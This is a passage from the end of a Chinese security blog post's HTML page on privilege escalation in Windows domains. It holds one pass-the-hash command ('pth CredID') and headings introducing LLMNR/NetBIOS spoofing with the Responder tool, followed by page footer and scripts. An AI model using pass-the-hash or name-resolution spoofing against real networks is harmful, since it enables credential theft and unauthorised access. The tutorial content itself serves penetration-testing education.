+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">pth CredID
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="无凭证下的权限获取">无凭证下的权限获取</h2>
+<h3 id="llmnr-和-netbios-欺骗攻击">LLMNR 和 NetBIOS 欺骗攻击</h3>
+<h4 id="responder-工具">Responder 工具</h4>
+<p>开启监听模式</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-02-15</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/" data-title="权限提升防御分析"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/" data-title="权限提升防御分析"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/" data-title="权限提升防御分析"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E5%9F%9F%E5%AE%89%E5%85%A8/">域安全</a>,&nbsp;<a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="prev" rel="prev" title="内网信息收集"><i class="fas fa-angle-left fa-fw"></i>内网信息收集</a>
+            <a href="/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/" class="next" rel="next" title="域内横向移动分析">域内横向移动分析<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
